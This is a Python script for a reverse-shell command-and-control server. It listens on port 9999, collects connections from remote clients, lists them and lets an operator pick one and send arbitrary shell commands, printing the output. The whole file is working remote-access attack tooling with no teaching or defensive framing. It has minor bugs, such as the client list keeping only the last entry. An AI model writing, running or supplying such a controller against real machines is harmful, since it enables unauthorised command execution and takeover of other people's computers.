import socket
import sys
import threading
import time
from queue import Queue

Threads=2
Jno=[1,2]
queue=Queue()
all_connections=[]
all_address=[]


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")
def start():
    while True:
        cmd=input('server>')
        if cmd=="list":
            list_connections()
        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_commands(conn)
        elif cmd=="quit":
            break
        else:
            print("command not recognized")
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid")
        return None
def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
def worker():
    for i in range(Threads):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()

def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            socket_accept()
        if x==2:
            start()
        queue.task_done()
def jobs():
    for x in Jno:
        queue.put(x)
    queue.join()
worker()
jobs()